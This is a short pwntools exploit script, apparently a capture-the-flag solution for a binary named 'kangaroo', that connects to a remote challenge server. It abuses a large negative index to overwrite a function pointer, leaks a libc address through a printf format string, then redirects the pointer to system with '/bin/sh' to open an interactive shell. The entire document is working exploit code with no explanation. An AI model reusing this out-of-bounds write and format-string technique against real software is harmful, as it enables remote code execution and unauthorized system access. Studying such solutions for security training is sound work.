from pwn import *

elf = ELF('./kangaroo')
libc = ELF('./libc.so.6') 
# io = process(elf.path)
io = remote('34.170.146.252', 54223)

SIZE = 0x48

def read(index, message):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.sendlineafter(b'Message: ', message)

def write(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(index).encode())

def clear():
    io.sendlineafter(b'> ', b'3')

index = -1024819115206086193
read(index, b'a'*8 + p64(elf.sym['printf']))
read(0, b'%p-%p-%p-%p-%p-%p-%p-%p!%p')
clear()

io.recvuntil(b'!0x')
leak_address = int(io.recv(12), 16)
log.info(f"leak address: {hex(leak_address)}")

libc.address = leak_address - 122 + 0xb0 - libc.sym["__libc_start_main"]

log.info(f"libc address: {hex(libc.address)}")

read(index, b'a' * 8 + p64(libc.sym["system"]))
read(0, b'/bin/sh')
clear()

io.interactive()

